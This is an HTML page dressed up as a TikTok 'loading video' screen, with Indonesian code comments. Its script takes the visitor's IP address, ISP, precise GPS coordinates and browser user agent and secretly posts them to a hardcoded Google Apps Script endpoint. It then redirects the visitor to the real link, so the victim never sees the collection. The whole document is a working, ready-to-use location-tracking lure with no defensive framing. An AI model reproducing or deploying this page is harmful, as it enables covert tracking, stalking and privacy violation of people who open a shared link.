<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
        }
        .loading-container {
            text-align: center;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #333;
            border-top: 5px solid #25f4ee;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            font-size: 16px;
            color: #ccc;
            margin-top: 10px;
        }
        .tiktok-logo {
            font-size: 36px;
            font-weight: bold;
            color: #fff;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="tiktok-logo">TikTok</div>
        <div class="spinner"></div>
        <div class="message">Memuat video...</div>
    </div>

    <script>
        (async function() {
            // Ambil parameter dari URL
            const urlParams = new URLSearchParams(window.location.search);
            const originalUrl = urlParams.get('url');
            const id = urlParams.get('id');

            if (!originalUrl || !id) {
                // Jika tidak ada parameter, redirect ke TikTok homepage
                window.location.href = 'https://www.tiktok.com';
                return;
            }

            // Fungsi untuk mendapatkan IP dan ISP
            async function getIpInfo() {
                try {
                    const response = await fetch('https://ip-api.com/json/?fields=61439'); // fields: status, country, region, city, isp, org, query
                    const data = await response.json();
                    if (data.status === 'success') {
                        return {
                            ip: data.query,
                            isp: data.isp || data.org || 'Tidak diketahui'
                        };
                    }
                } catch (err) {
                    console.error('Gagal mengambil IP info:', err);
                }
                return {
                    ip: '0.0.0.0',
                    isp: 'Tidak diketahui'
                };
            }

            // Fungsi untuk mendapatkan lokasi
            function getLocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        resolve({ lat: '', lon: '' });
                        return;
                    }
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                lat: position.coords.latitude,
                                lon: position.coords.longitude
                            });
                        },
                        (error) => {
                            console.error('Geolocation error:', error.message);
                            resolve({ lat: '', lon: '' });
                        },
                        { timeout: 8000 }
                    );
                });
            }

            // Kumpulkan semua data
            const [ipInfo, location] = await Promise.all([
                getIpInfo(),
                getLocation()
            ]);

            const device = navigator.userAgent;
            const data = {
                id: id,
                lat: location.lat,
                lon: location.lon,
                ip: ipInfo.ip,
                isp: ipInfo.isp,
                device: device
            };

            // Kirim data ke Apps Script (POST dengan form-urlencoded)
            const appsScriptUrl = 'https://script.google.com/macros/s/AKfycbzI3SGqGVUH7Phg4B2bCbRNWzZfjx4ujTpvMUtuD-QJ3epigrCLsw7XfeAV2JiDr5_H/exec';

            // Gunakan FormData untuk mengirim sebagai form-urlencoded
            const formData = new FormData();
            formData.append('id', data.id);
            formData.append('lat', data.lat);
            formData.append('lon', data.lon);
            formData.append('ip', data.ip);
            formData.append('isp', data.isp);
            formData.append('device', data.device);

            try {
                await fetch(appsScriptUrl, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors' // Agar tidak terkendala CORS
                });
                console.log('Data terkirim');
            } catch (err) {
                console.error('Gagal mengirim data:', err);
            }

            // Redirect ke link asli setelah 1 detik
            setTimeout(() => {
                window.location.href = originalUrl;
            }, 1000);
        })();
    </script>
</body>
</html>
